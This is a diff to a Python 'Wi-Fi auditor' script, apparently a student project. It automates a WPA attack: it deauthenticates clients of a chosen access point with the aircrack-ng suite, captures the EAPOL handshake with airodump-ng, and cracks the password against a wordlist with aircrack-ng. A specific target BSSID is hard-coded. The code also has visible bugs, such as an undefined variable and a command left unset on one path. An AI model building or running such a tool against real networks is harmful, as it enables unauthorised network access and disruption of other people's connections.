@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 # WIFI AUDITOR TOOL FUNCTION FILE
+import os
 import re
 import subprocess
 import sys
@@ -9,11 +10,13 @@ import time
 class Auditor:
 	# Options list for the Auditor class
 	options = {
-	"ap_channel": "157",
-	"ap_bssid": "36:cf:f6:f2:fb:34",
-	"ap_ssid": "",
-	"eapol_cap_name": "/home/matt_school/Desktop/eapol_packets",
-	"dict_file": "/usr/share/wordlists/john.lst"
+	"ap_channel"          : "157",
+	"ap_bssid"            : "36:cf:f6:f2:fb:34",
+	"ap_ssid"             : "",
+	"eapol_file_path"     : "",
+	"eapol_file_name"     : "",
+	"eapol_save_path"     : "",
+	"dict_file"           : "/usr/share/wordlists/john.lst"
 	}
 
 	def __init__(self, iface, iface_mode):
@@ -151,11 +154,13 @@ class Auditor:
 		'''
 		# Define the required options to be set for this attack
 		req_opts = {
-		"ap_channel"     : 1,
-		"ap_bssid"       : 1,
-		"ap_ssid"        : 0,
-		"eapol_cap_name" : 1,
-		"dict_file"      : 1,
+		"ap_channel"      : 1,
+		"ap_bssid"        : 1,
+		"ap_ssid"         : 0,
+		"eapol_file_path" : 0,
+		"eapol_file_name" : 1,
+		"eapol_save_path" : 1,
+		"dict_file"       : 1,
 		}
 
 		# Show the current required options and prompt them to
@@ -163,25 +168,57 @@ class Auditor:
 		self.choose_option(req_opts)
 
 		# Before running the attack make sure the option requirements are set
-		#if self.requirements_satisified(req_opts):
+		if not self.requirements_satisfied(req_opts):
+			self.choose_option(req_opts)
+			
+		else:
+			# Print the attacking messages
+			self.clear_term()
+			print("-----ATTEMPTING TO CAPTURE WPA HANDSHAKE-----")
+			print(f"\nInterface     --> {self.iface}")
+			print(f"Interface Mode --> {self.iface_mode}")
+			print(f"AP BSSID        --> {self.options['ap_bssid']}")
+			print(f"AP Channel      --> {self.options['ap_channel']}")
+			print(f"\n---------------------------------------------")
 
-		# Create the listener for capturing EAPOL packets
-		listener_proc = self.create_listener()
+			# Create the listener for capturing EAPOL packets
+			listener_proc = self.create_listener()
 
-		# Create the deauther for deauthing the specifed AP to catch the EAPOL packets
-		deauth_proc = self.create_deauther()
+			# Create the deauther for deauthing the specifed AP to catch the EAPOL packets
+			deauth_proc = self.create_deauther()
 
-		# Terminate the deauther process and wait a couple seconds
-		deauth_proc.terminate()
-		time.sleep(2)
-		
-		# Terminate the listener process
-		listener_proc.terminate()
+			# Terminate the deauther process and wait a couple seconds
+			deauth_proc.terminate()
+			time.sleep(2)
 
-		# Crack the password from the captured EAPOL packets
-		self.create_cracker()
-	#else:
-	#		self.select_attack()
+			# Timer for 30 seconds to see if the attack failed
+			start = time.time()
+			max_duration = 30 
+
+
+			# Monitor the standard output of the listener for the "EAPOL" message
+			for line in iter(listener_proc.stdout.readline, b''):
+
+				# Detect the EAPOL packets and terminate the listener
+				if "WPA handshake" in line:
+					time.sleep(2)
+					listener_proc.terminate()
+					break
+
+				# Check if the attack has been running for too long
+				if time.time() - start >= max_duration:
+					listener_proc.terminate()
+					deauth_proc.terminate()
+					print("********* Attack Failed **********")
+					print("**** Too Much Time Has Passed ****")
+					time.sleep(2)
+					self.select_attack()
+					break
+
+
+
+			# Crack the password from the captured EAPOL packets
+			self.create_cracker()
 
 	def auth_flood():
 		'''
@@ -328,17 +365,43 @@ class Auditor:
 		Run a command to start for the listener (catches EAPOL packets)
 		'''
 		# List for all of the options of the airodump command.
-		listener_cmd = [
-		"airodump-ng",
-		"-c", f"{self.options['ap_channel']}",
-		"-d", f"{self.options['ap_bssid']}",
-		"-w", f"{self.options['eapol_cap_name']}",
-		f"{self.iface}"
-		]
+		if self.options['eapol_file_name'] and not self.options['eapol_file_path']:
+			eapol_input = os.path.join(os.getcwd(), self.options['eapol_file_name'])
+			listener_cmd = [
+			"airodump-ng",
+			"-c", f"{self.options['ap_channel']}",
+			"-d", f"{self.options['ap_bssid']}",
+			"-w", f"{eapol_input}",
+			f"{self.iface}"
+			]
+
+
+		if self.options['eapol_file_name'] and self.options['eapol_file_path']:
+			save_path = self.options['eapol_file_path']
+			if save_path[-1] != '/':
+				save_path += '/'
+				eapol_input = os.path.join(save_path, self.options['eapol_file_name'])
+				listener_cmd = [
+				"airodump-ng",
+				"-c", f"{self.options['ap_channel']}",
+				"-d", f"{self.options['ap_bssid']}",
+				"-w", f"{eapol_input}",
+				f"{self.iface}"
+				]
+			else:
+				eapol_input = os.path.join(self.options['eapol_file_path'], self.options['eapol_file_name'])
+				listener_cmd = [
+				"airodump-ng",
+				"-c", f"{self.options['ap_channel']}",
+				"-d", f"{self.options['ap_bssid']}",
+				"-w", f"{eapol_input}",
+				f"{self.iface}"
+				]
+
 
 		try:
 			# Run the listener command
-			listener_proc  = subprocess.Popen(listener_cmd)
+			listener_proc  = subprocess.Popen(listener_cmd, stdout=subprocess.PIPE, text=True, bufsize=1)
 
 		# If subprocess gives this error exit
 		except Exception as e:
@@ -357,7 +420,7 @@ class Auditor:
 		"aircrack-ng",
 		"-w", f"{self.options['dict_file']}",
 		"-b", f"{self.options['ap_bssid']}",
-		f"{self.options['eapol_cap_name']}",
+		f"{self.options['eapol_save_path']}",
 		]
 
 		try:
@@ -368,6 +431,25 @@ class Auditor:
 		except subprocess.CalledProcessError:
 			print("Something went wrong!!")
 			sys.exit()
+		finally: 
+			while True:
+				# See if the user is done
+				print("*" * 26 + " Attack Completed " + "*" * 26 + "\n")
+				print("Would you like to do another attack | (Y|n)")
+				back_to_attacks = input("\n--> ")
+				
+				if back_to_attacks.lower() == 'y':
+					self.select_attack()
+					break
+				elif back_to_attacks.lower() == 'n':
+					print("\n" * 3)
+					print("-" * 69)
+					print("\n**** Have a Good Day! :) ****")
+					sys.exit()
+				else:
+					print("\n" * 3)
+					print("**** Retry Answer ****")
+					continue
 
 
 	def create_deauther(self):
@@ -385,9 +467,9 @@ class Auditor:
 
 		try:
 			# Run the Deauthentication command
-			time.sleep(3)
-			deauth_proc = subprocess.Popen(deauth_cmd)
-			time.sleep(3)
+			time.sleep(1)
+			deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, text=True, bufsize=1)
+			time.sleep(2)
 
 		# If subprocess gives this error exit
 		except Exception as e:
@@ -428,9 +510,9 @@ class Auditor:
 		'''
 		usage_statement = """
 ____________COMMANDS____________
- 1. set
- 2. run
- 3. quit
+1. set
+2. run
+3. quit
 --------------------------------
 
 _____________SYNTAX_____________
@@ -499,16 +581,17 @@ _____________SYNTAX_____________
 
 			# Do a case insensitive search to find if the command is formatted properly
 			if option_cmds[0].lower() == 'set' and option_cmds[1].lower() in self.options.keys():
-				# Return the option_name and option_value1
-				return [option_cmds[1].lower(), option_cmds[2]]
+				# Pass everything into set_parser
+				result = self.set_cmd_parser(option_cmds)
+				if result:
+					return result
 
 			# Otherwise return improper option_name or command name
 			else:
-				# Clear the terminal and print the error message
 				self.clear_term()
 				print(f'**** Bad Command Format ****\nFailed Command --> {user_input}\n**** Retry Command ****')
 				time.sleep(4)
-				return None
+				return False
 
 		elif 'run' in option_cmds[0].lower() and len(option_cmds) == 1:
 			return 'run'
@@ -532,12 +615,112 @@ _____________SYNTAX_____________
 			# Check the option requirements to see if the value is given
 			if req_opts[option[0]] == 1 and not option[1]:
 				self.clear_term()
-				print(f"Option Value for option[1] Option Needs to be set\nSet it then run the attack")
+				print(f"Option Value for {option[0]} Option Needs to be set\nSet it then run the attack")
 				time.sleep(3)
 				return False
+		return True
 
 		# If the options are all set properly proceed
 		return True
+
+	def unique_eapol_name(self, base_filename, save_dir):
+		'''
+		Ensure that the eapol_file_name passed in is unique.
+		return the valid_eapol_path to to eventually crack
+		the eapol packets.
+		'''
+		if not os.path.exists(save_dir):
+			# Notify the user of the bad file path and return False
+			print("**** Bad File Path ****")
+			time.sleep(2)
+			# Bring up the options again
+			self.choose_option()
+
+		# User might not add the trailing /
+		if save_dir[-1] != '/':
+			save_dir = save_dir + '/'
+
+		# Eapol packets get with a suffix, try the file_path specified to
+		# make sure the save location is valid.
+		suffix = 1
+		while True:
+			potential_filename = os.path.join(save_dir, f"{base_filename}-{suffix:02d}.cap")
+			if not os.path.exists(potential_filename):
+				# If the file path is valid set the eapol_save_path
+				self.options['eapol_save_path'] = potential_filename
+				break
+
+			suffix += 1
+
+	def bssid_handler(self, bssid_addr):
+		'''
+		Makes sure the MAC address is valid first,
+		if it is, make sure it is in the standard format
+		with colons as seperators
+		'''
+		# Convert bssid_addr to lowercase
+		bssid_addr = bssid_addr.lower()
+
+		# Pattern to validate the BSSID's being passed in
+		bssid_pattern = re.compile(r'^([0-9a-f]{2}[:-]?){5}([0-9a-f]{2})$')
+
+		# Check if the BSSID is valid
+		valid_bssid = bssid_pattern.match(bssid_addr)
+		if valid_bssid:
+			# Normalize BSSID format by replacing hypens and dots with colons
+			normalized_bssid = re.sub(r'[^a-f0-9]', ':', bssid_addr)
+			return normalized_bssid
+		else:
+			return False
+
+	def set_cmd_parser(self, opt_lst):
+		'''
+		Checks for all of the possible options 
+		that can be set with the set command.
+		'''
+		# Check if it was eapol_file_name trying to be set and eapol_file_path not set.
+		if opt_lst[1].lower() == 'eapol_file_name' and not self.options['eapol_file_path']:
+			# Set the eapol_save_path to make it possible to crack the Wi-Fi password
+			self.unique_eapol_name(opt_lst[2], os.getcwd())
+			return [opt_lst[1].lower(), opt_lst[2]]
+
+		if opt_lst[1].lower() == 'eapol_file_name' and self.options['eapol_file_path']:
+			self.unique_eapol_name(opt_lst[2], self.options['eapol_file_path'])
+			return [opt_lst[1].lower(), opt_lst[2]]
+
+		# Check if the eapol_file_path was passed in and eapol_file_name is set
+		if opt_lst[1].lower() == 'eapol_file_path' and self.options['eapol_file_name']:
+			# Set the eapols_save_path to make it possible to crack the Wi-Fi password
+			self.unique_eapol_name(self.options['eapol_file_name'], opt_lst[2])
+			return [opt_lst[1].lower(), opt_lst[2]]
+
+		if opt_lst[1].lower() == 'eapol_file_path':
+			if os.path.exists(opt_lst[2]):
+				return [opt_lst[1].lower(), opt_lst[2]]
+			else:
+				self.clear_term()
+				print("**** Bad File Path ****")
+				time.sleep(2)
+
+		# Check that the BSSID is valid and if it is return it in the proper format
+		if opt_lst[1].lower() == 'ap_bssid':
+			standard_bssid = self.bssid_handler(opt_lst[2])
+			if standard_bssid:
+				return [opt_lst[1].lower(), standard_bssid]
+			else:
+				self.clear_term()
+				print("**** Invalid BSSID ****")
+				time.sleep(2)
+
+		# Check that the dictonary file exists
+		if option_lst[1].lower() == 'dict_file':
+			if os.path.exists(opt_lst[2]):
+				return [opt_lst[1].lower(), opt_lst[2]]
+			else:
+				self.clear_term()
+				print("**** Invalid Dictionary File ****")
+				time.sleep(2)
+
 
 	def banner_print(self):
 		'''
@@ -559,16 +742,7 @@ _____________SYNTAX_____________
 		print("----------------------------------------------------------------------------------")
 
 
-options = {
-"ap_channel": "",
-"ap_bssid": "",
-"ap_ssid": "",
-"eapol_cap_name": "",
-"dict_file": ""
-}
-
-wlan0interface = Auditor('wlan0', 'Monitor')
-wlan0interface.select_attack()
-
+wlan0instance = Auditor('wlan0', 'Monitor')
+wlan0instance.select_attack()
 
 
